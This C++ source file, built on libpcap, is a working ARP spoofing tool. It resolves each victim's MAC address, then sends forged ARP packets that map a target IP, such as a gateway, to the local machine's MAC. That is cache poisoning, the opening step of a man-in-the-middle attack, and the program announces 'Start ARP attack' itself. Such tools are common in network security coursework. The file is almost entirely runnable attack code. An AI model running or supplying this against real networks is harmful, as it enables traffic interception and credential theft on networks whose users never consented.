#include <cstdio>
#include <map>
#include <string>
#include <pcap.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include "ethhdr.h"
#include "arphdr.h"

#define PROTO_ARP 0x806
#define ARP_REPLY 0x2

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

struct MACArray
{
	uint8_t mac[6];
};

Ip localIpAddress;
Mac localMacAddress;

std::map<std::string, MACArray> arpTable;

void usage()
{
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

void GetDeviceIPAndMAC(const char* deviceName)
{
	pcap_if_t *alldevs;
	char errbuf[PCAP_ERRBUF_SIZE];
	uint32_t res = pcap_findalldevs(&alldevs, errbuf);
	printf("Retrieving IP address for device %s...\n", deviceName);
	
	if(res != 0)
	{
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, errbuf);
	}
	
	for(pcap_if_t *d = alldevs; d != NULL; d = d->next)
	{
		if (strcmp(d->name, deviceName) == 0)
		{
			for(pcap_addr_t *a = d->addresses; a != NULL; a = a->next)
			{
				if(a->addr->sa_family == AF_INET)
				{
					localIpAddress = Ip(ntohl(((struct sockaddr_in*)a->addr)->sin_addr.s_addr));
					
					struct ifreq s;
					struct sockaddr *sa; 
					uint32_t fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
					strcpy(s.ifr_name, d->name);
					
					// Get MAC Address
					if (ioctl(fd, SIOCGIFHWADDR, &s) != 0)
					{
						printf("Failed to find MAC address.\n");
						pcap_freealldevs(alldevs);
						close(fd);
						exit(0);
					}
					
					uint8_t tmpmac[6];
					for (uint32_t i = 0; i < 6; i++)
						tmpmac[i] = s.ifr_addr.sa_data[i];

					localMacAddress = Mac(tmpmac);
					close(fd);
					pcap_freealldevs(alldevs);
					return;
				}
			}
		}
	}
	
	printf("Failed to find IP address.\n");
	pcap_freealldevs(alldevs);
	exit(0);
}

void SendARPPacket(pcap_t* handle, uint8_t opcode, Mac targetMAC, Mac sourceMac, Ip targetIP, Ip sourceIP)
{
	EthArpPacket packet;
	packet.eth_.dmac_ = targetMAC;
	packet.eth_.smac_ = sourceMac;
	packet.eth_.type_ = htons(EthHdr::Arp);
	
	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(opcode);
	packet.arp_.smac_ = sourceMac;
	packet.arp_.sip_ = htonl(sourceIP);
	packet.arp_.tmac_ = targetMAC;
	packet.arp_.tip_ = htonl(targetIP);
	
	uint32_t res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0)
	{
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
}

void AddARPTable(pcap_t* handle, const char* ipAddr)
{
	// Check ARP table
	auto iter = arpTable.find(ipAddr);
        if (iter != arpTable.end())
        {
        	// If exists, return function.
        	return;
        }
        
	struct bpf_program fp;

	// Set arp filter (arp opcode = reply)
	uint32_t res = pcap_compile(handle, &fp, "arp and arp[6:2] = 2", 0, PCAP_NETMASK_UNKNOWN);
	if (res != 0)
	{
		fprintf(stderr, "pcap_compile return %d error=%s\n", res, pcap_geterr(handle));
		exit(EXIT_FAILURE);
	}
	
	res = pcap_setfilter(handle, &fp);
	if (res != 0)
	{
		fprintf(stderr, "pcap_setfilter return %d error=%s\n", res, pcap_geterr(handle));
		exit(EXIT_FAILURE);
	}
	
	// Send ARP broadcast to get MAC address
        SendARPPacket(handle, ArpHdr::Request, Mac("ff:ff:ff:ff:ff:ff"), localMacAddress, Ip(ipAddr), localIpAddress);
	// Loop until we get requested ARP reply packet
	while (true)
	{
		struct pcap_pkthdr* header;
		const u_char* recvPacket;
		res = pcap_next_ex(handle, &header, &recvPacket);
		
		if (res == 0) return;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
		{
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			return;
		}
		
		EthArpPacket recv;
		memcpy(&recv, recvPacket, sizeof(recv));
		
		// Check if packet is ARP reply and sender is requested IP
		uint32_t senderIp = (recv.arp_.sip());
		if (senderIp == Ip(ipAddr))
		{
			uint8_t* senderMac = ((uint8_t*)(recv.arp_.smac()));
	        	MACArray macarr = { senderMac[0], senderMac[1], senderMac[2], senderMac[3], senderMac[4], senderMac[5] };
	        	arpTable[ipAddr] = macarr;
			break;
		}
	}
}

int main(int argc, char* argv[])
{
	if (argc % 2 != 0 || argc < 3)
	{
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	
	GetDeviceIPAndMAC(dev);
	printf("===== Device Info of %s =====\n", dev);
	printf("Local IP: %s\nLocal MAC: %s\n", ((std::string)localIpAddress).c_str(), ((std::string)localMacAddress).c_str());
	printf("===============================\n\n");

	uint32_t loopCount = (argc - 1) / 2;
	char* victimIP;
	char* targetIP;
	printf("Start ARP attack...\nTotal targets: %d\n", loopCount);
	for (uint32_t i = 1; i <= loopCount; i++)
	{
		victimIP = argv[(2 * i)];
		targetIP = argv[(2 * i) + 1];
		// Check arp table made with std::map
		AddARPTable(handle, victimIP);
		
		// Send spoofed ARP packet
		SendARPPacket(handle, ArpHdr::Request, Mac(arpTable[victimIP].mac), localMacAddress, Ip(victimIP), Ip(targetIP));
		printf("[#%d] Send an ARP reply (Victim: %s, Spoofed target: %s)\n", i, victimIP, targetIP);
	}

	pcap_close(handle);
	return 0;
}
